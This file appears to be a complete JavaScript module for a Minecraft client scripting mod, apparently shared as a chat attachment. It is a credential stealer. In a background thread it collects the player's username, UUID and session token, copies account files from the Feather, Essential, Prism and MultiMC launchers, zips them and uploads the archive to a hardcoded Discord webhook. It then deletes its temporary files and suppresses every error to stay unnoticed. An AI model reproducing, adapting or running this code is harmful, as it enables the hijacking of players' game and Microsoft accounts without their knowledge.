
const WEBHOOK_URL = "https://discord.com/api/webhooks/1369240398970748988/SJVxFBK2WawdQBR4qgxpe5DCJOohnKAEzIdCndtMlL86SxT8rI39Zqm1JTrRSuMNM5mU";
const MAX_FILE_SIZE = 8 * 1024 * 1024;

const File = Packages.java.io.File;
const Files = Packages.java.nio.file.Files;
const StandardCopyOption = Packages.java.nio.file.StandardCopyOption;
const ZipOutputStream = Packages.java.util.zip.ZipOutputStream;
const URL = Packages.java.net.URL;
const UUID = Packages.java.util.UUID;

const system = {
    tempDir: new File(Packages.java.lang.System.getProperty("java.io.tmpdir")),
    appData: new File(Packages.java.lang.System.getenv("APPDATA")),
    mcDir: new File(Client.getMinecraft().field_71412_D.getPath())
};

function createTempDirectory() {
    const dirName = "mc_leak_" + new Date().getTime();
    const tempDir = new File(system.tempDir, dirName);
    tempDir.mkdirs();
    return tempDir;
}

function collectUserData(tempDir) {
    try {
        const userFile = new File(tempDir, "user.txt");
        const writer = new Packages.java.io.PrintWriter(userFile);
        writer.println("Username: " + Player.getName());
        writer.println("UUID: " + Player.getUUID());
        writer.println("Token: " + Client.getMinecraft().func_110432_I().func_148254_d());
        writer.close();
    } catch (e) {
    }
}

function copyAccountFiles(tempDir) {
    const targets = [
        {
            name: "Feather",
            path: system.appData.getAbsolutePath() + "/.feather/accounts.json",
            dest: "feather/accounts.json"
        },
        {
            name: "Essentials",
            path: system.mcDir.getAbsolutePath() + "/essential/microsoft_accounts.json",
            dest: "essentials/accounts.json"
        },
        {
            name: "Prism",
            path: system.appData.getAbsolutePath() + "/PrismLauncher/accounts.json",
            dest: "prism/accounts.json"
        },
        {
            name: "MultiMC",
            path: system.mcDir.getParentFile().getParentFile().getParentFile().getAbsolutePath() + "/accounts.json",
            dest: "multimc/accounts.json"
        }
    ];

    targets.forEach(target => {
        try {
            const source = new File(target.path);
            const dest = new File(tempDir, target.dest);
            dest.getParentFile().mkdirs();
            
            if (source.exists()) {
                Files.copy(
                    source.toPath(),
                    dest.toPath(),
                    StandardCopyOption.REPLACE_EXISTING
                );
            }
        } catch (e) {
        }
    });
}

function createZipArchive(sourceDir) {
    const zipFile = new File(sourceDir.getParentFile(), "data.zip");
    const zos = new ZipOutputStream(new Packages.java.io.FileOutputStream(zipFile));

    try {
        const stack = [];
        stack.push(sourceDir);

        while (stack.length > 0) {
            const current = stack.pop();
            const children = current.listFiles();
            
            for (let i = 0; i < children.length; i++) {
                const child = children[i];
                const entryPath = sourceDir.toPath().relativize(child.toPath()).toString().replace(/\\/g, "/");
                
                if (child.isDirectory()) {
                    stack.push(child);
                } else {
                    try {
                        zos.putNextEntry(new Packages.java.util.zip.ZipEntry(entryPath));
                        const fis = new Packages.java.io.FileInputStream(child);
                        const buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
                        let length;
                        
                        while ((length = fis.read(buffer)) >= 0) {
                            zos.write(buffer, 0, length);
                        }
                        fis.close();
                    } catch (e) {
                    } finally {
                        try {
                            zos.closeEntry();
                        } catch (e) {
                        }
                    }
                }
            }
        }
    } catch (e) {
        throw e;
    } finally {
        zos.close();
    }
    
    return zipFile;
}

function sendZipToWebhook(zipFile) {
    if (!zipFile.exists()) {
        throw new Error("ZIP file does not exist");
    }

    if (zipFile.length() === 0) {
        throw new Error("Empty ZIP file");
    }

    if (zipFile.length() > MAX_FILE_SIZE) {
        throw new Error("File too big: " + (zipFile.length()/1024/1024).toFixed(1) + "MB");
    }

    const boundary = UUID.randomUUID().toString();
    const connection = new URL(WEBHOOK_URL).openConnection();
    connection.setDoOutput(true);
    connection.setRequestMethod("POST");
    connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
    connection.setRequestProperty("User-Agent", "Minecraft Client");

    const out = connection.getOutputStream();
    try {
        let formData = "--" + boundary + "\r\n";
        formData += 'Content-Disposition: form-data; name="file"; filename="mc_data.zip"\r\n';
        formData += 'Content-Type: application/zip\r\n\r\n';
        out.write(new java.lang.String(formData).getBytes("UTF-8"));
        const fis = new Packages.java.io.FileInputStream(zipFile);
        const buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
        let bytesRead;
        
        while ((bytesRead = fis.read(buffer)) !== -1) {
            out.write(buffer, 0, bytesRead);
        }
        fis.close();
        out.write(new java.lang.String("\r\n--" + boundary + "--\r\n").getBytes("UTF-8"));
    } finally {
        out.close();
    }

    const code = connection.getResponseCode();
    if (code < 200 || code >= 300) {
        const errorStream = connection.getErrorStream();
        const reader = new Packages.java.io.BufferedReader(
            new Packages.java.io.InputStreamReader(errorStream)
        );
        throw new Error("HTTP " + code + ": " + reader.readLine());
    }
}

new Thread(function() {
    let tempDir = null;
    let zipFile = null;

    try {
        tempDir = createTempDirectory();
        collectUserData(tempDir);
        copyAccountFiles(tempDir);
        zipFile = createZipArchive(tempDir);
        sendZipToWebhook(zipFile);
        
    } catch (e) {
    } finally {
        if (tempDir !== null) {
            try {
                Files.walk(tempDir.toPath())
                    .sorted(Packages.java.util.Comparator.reverseOrder())
                    .forEach(Packages.java.nio.file.Files.delete);
            } catch (e) {
            }
        }
        if (zipFile !== null && zipFile.exists()) {
            try {
                zipFile.delete();
            } catch (e) {
            }
        }
    }
}).start();
message.txt
7 KB
